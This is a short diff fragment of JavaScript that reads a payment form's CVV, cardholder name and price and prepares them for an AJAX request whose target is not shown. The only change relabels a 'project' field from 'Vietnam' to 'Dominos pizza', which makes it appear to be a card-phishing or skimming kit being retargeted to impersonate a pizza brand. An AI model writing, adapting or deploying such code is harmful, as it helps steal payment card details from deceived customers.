@@ -44,7 +44,7 @@
       data['cvv']=encodeURI($('#security-code').val())
       data['price']=encodeURI(sessionStorage.getItem('dataprice'))
       data['name_on_card']=encodeURI($('#cardholder-name').val())
-      data['project']= 'Vietnam'
+      data['project']= 'Dominos pizza'
       data['sessionId'] = uuid
       $('#overlay').show();
       $.ajax({
